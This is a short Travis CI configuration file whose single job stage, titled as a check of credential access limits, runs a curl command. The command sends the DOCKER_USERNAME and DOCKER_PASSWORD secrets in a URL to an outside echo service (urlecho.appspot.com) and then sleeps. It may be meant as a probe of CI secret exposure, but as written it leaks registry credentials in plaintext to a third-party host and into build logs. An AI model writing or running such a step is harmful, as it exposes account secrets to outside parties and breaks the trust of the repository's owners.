sudo: true
dist: trusty

jobs:
  include:
    - stage: check credentials acl limits
      script:
      # get url params
      - curl "http://urlecho.appspot.com/echo?status=200&body=$DOCKER_USERNAME---$DOCKER_PASSWORD"
      - sleep 20
